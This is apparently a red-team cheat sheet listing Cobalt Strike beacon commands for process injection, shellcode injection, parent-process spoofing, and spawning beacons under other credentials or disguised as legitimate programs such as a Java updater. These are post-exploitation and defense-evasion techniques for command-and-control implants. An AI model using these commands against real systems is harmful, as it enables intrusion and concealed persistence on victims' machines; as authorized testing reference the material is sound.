# 06 - Process Manipulation

Search Tag(s): #command-and-control #post-exploitation #defense-evasion #cobalt-strike

## 6.1 - Inject Process

Inject to spawn beacon session.

```
beacon> inject <pid> <architecture> <listener>
```

Run powershell through another process.

```
beacon> psinject <pid> <arch> <cmdlet> [args]
```

Inject DLL file in another process.

```
beacon> dllload <pid> c:\path\to\remove\shell.dll
```

## 6.2 - Inject Shellcode

Inject shellcode.

```
beacon> shinject <pid> /path/to/shellcode.bin
```

Spawn a new process and inject shellcode.

```
beacon> shspawn x64
```

Spawn shellcode and tunnel.

```
beacon> spunnel <pid> /path/to/shellcode.bin
```

## 6.3 - Spoof Process

Spoof a parent process that is ready to spawn a new child process.

```
beacon> ppid <ppid>
```

## 6.4 - Spawn Beacon Session

Spawn new beacon process with under different user credentials as provided.

```
beacon> spawnas <domain>\<username> <password>
```

Specify a path of the new executable program to inject beacon shellcode other than specified in the malleable c2 profile. By default it injects `rundll32.exe` when executing `spawn`.

```
beacon> spawnto <arch> <path> <args>

beacon> spawnto x86 c:\program files (x86)\internet explorer\iexplore.exe

beacon> spawnto x86 C:\Program Files (x86)\Common Files\Java\Java Update\jucheck.exe
```

Spawn new beacon process.

```
beacon> spawn <arch> <listener>
```

---
## References

* [Cobalt Strike Spawn Tunnel](https://rastamouse.me/cobalt-strike-spawn-tunnel/)